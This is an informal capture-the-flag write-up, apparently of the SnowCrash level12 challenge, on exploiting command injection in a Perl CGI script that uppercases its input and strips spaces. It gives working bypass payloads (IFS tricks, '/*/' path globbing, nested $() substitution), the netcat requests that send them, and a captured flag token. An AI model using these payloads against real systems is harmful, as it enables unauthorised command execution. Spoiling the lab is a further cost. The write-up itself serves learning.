so after 3 days of command injection on dash i found it

the code: 
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

tldr: cgi perl script vulnerable to cmd injection but no apparent output, nor spaces nor lowercase letters, so `;getflag>/tmp/f` wont do it this time...

so in reality this script apparently does nothing: receives two args, does grep, split, compare, and print one or two dots

only one line matters here, ```@output = `egrep "^$xx" /tmp/xd 2>&1`;``` which with it backticks launches a shell command with user supplied input

![HOWEVER](https://media1.tenor.com/m/1B5GF0waR4IAAAAC/cependant-jdg.gif)

the user supplied input is not such an input, as all letters go CAPS and everything after a space is deleted.
we're also in an egrep command, which really doesnt do anything but print an output, and the script really doesnt do anything but print dots.

our classic `getflag > /tmp/f` wont work, even in its `getflag>/tmp/f` form as it will become `GETFLAG>/TMP/F`

## Step 1. Denial

So of course, we werent buying that. 

> you can bypass it with a newline!

nope

> when you put a `#` it skips the validation!

huh?

> but look after the split it does something with the `y` arg!

hmm look closer because no too

we had few more ideas like that, meaning that...

Step 1 took 2 days.

## Step 2. Anger

i dont think i need to say too much here, it wasnt an easy path and many things were tried...

## Step 3. Bargaining

so we tried to negotiate out `getflag>/tmp/f` a little too hard, whice gave payloads that looked like:
```bash
echo 'system("getflag > /tmp/f")' > /tmp/xd #perl system command
echo -ne "GET /?x='\";${IFS%??}#${IFS}${IFS%??}$(${_}${IFS%??})\"<' HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc localhost 4646
```
hoping it would be decoded to:

`egrep "^";${IFS%??}#${IFS}${IFS%??}$(${_}${IFS%??})"<" /tmp/xd 2>&1`

```bash
";${IFS%??}#${IFS}${IFS%??}$(${_}${IFS%??})"<
 |    |    |   |      |     |  |     |      |
 |    |    |   |      |     |  |     |      |
 |    |    |   |      |     |  |     |    Inject `/tmp/xd` into created perl shell
 |    |    |   |      |     |  |     | 
 |    |    |   |      |     |  |     Space
 |    |    |   |      |     |  |
 |    |    |   |      |     |  Should be equal to `/bin/perl`
 |    |    |   |      |     |
 |    |    |   |      |  Begin cmd execution
 |    |    |   |      |
 |    |    |   |      Space (to be sure)
 |    |    |   |
 |    |    |  put newline (`\t\n `)
 |    |    |
 |    |  Comment
 |    |
 |   == ` `
 |
Close quotes && begin new cmd
```

but this couldnt work for at least three reasons:
1. the first quote closes the first arg of egrep command, but we are forced to put another one as the end because otherwise the number would have been odd
2. egrep wants two args and we gave only one which meant egrep was waiting on stdin
3. but in reality it wasnt because the command is rearranged and transformed into `egrep "^" /tmp/xd 2>&1; $(${_})<`
4. `$_` doesnt actually is `/bin/perl` but instead `^`, as `$_` represents the last arg and not the last command (huh)

## Step 4. Depression

So what after this? Are we meant for this? Have we really spent our life doing things we dont understand? Are we truly that stupid? 
The answer, it seems, was yes.

In this phase, you go crazy and begin to find everything you can on the server. One thing I didn't mentionned here is that, for our tests, we were replicating the script locally and modified it to use argv, and not CGI. 

So after a bit of looking we find `/var/log/apache2/error.log` which contained multiple `sh: line 1: unexpected EOF while looking for matching "`.
Maybe the CGI was a specificity we overlooked, so we began testing on the server, tracing all spawned processes and looking at the error logs
	
## Step 5. Acceptance

> why did you tried so hard to use variables like that?

ah interesting question. you see, we tried very hard to execute a command by typing its name, e.g. with a payload like `;whoami`, `;$(whoami)`, and so on, but remember every letter is uppercased, and `WHOAMI` doesnt exists as a binary.

so we quickly concluded binary exec is not possible, but maybe a little too quickly

back to our error logs: tinkering with the above payload, I once made a mistake that was decisive.

Why is that? I was trying to make sure of what directory the script spawns in, but as the script didnt outputted anything i tried various substitutions.

Then this happened:

```bash
echo -ne "GET /?x='$(<$(${PWD}))' HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc localhost 4646
[...script outputs dots...]

tail /var/log/apache2/error.log
[...]
[error] [client 127.0.0.1] sh: 1: 
[error] [client 127.0.0.1] /var/www/level12: Permission denied
[error] [client 127.0.0.1] sh: 1: cannot open : No such file
```

So thats how we get our output: we launch command of the output of another command. So if we were to to `$($(/bin/getflag))` we should have `sh: [getflag output]: command not found`, thus revealing the flag!!

But two problems: 
1. Letters are uppercased (`$($(GETFLAG))`)
2. Paths are forbidden (`$($(/BIN/))`)

One possible solution: we control /tmp. If we were to do `ln -s /bin/getflag /tmp/GETFLAG`, the only thing left is to try and find a way to access `/tmp`. This is the exact same problem than if you try to find a file that is in a subdirectory, but you dont know which one. Dont remind you of anything? Remember `*`?

Try on your machine `/*/ls`, you'll find it works. So we do the same:

```bash
level12@SnowCrash:~$ ln -s /bin/getflag /tmp/GETFLAG
level12@SnowCrash:~$ echo -ne 'GET /?x=${IFS}$(<$(/*/getflag)) HTTP/1.1\r\nHost: localhost\r\n\r\n' | nc localhost 4646
HTTP/1.1 200 OK
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2
Content-Type: text/html

..
level12@SnowCrash:~$ tail /var/log/apache2/error.log
[error] [client 127.0.0.1] 
[error] [client 127.0.0.1] sh: 1: cannot open Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr: No such file
level12@SnowCrash:~$ su level13
Password:
level13@SnowCrash:~$
```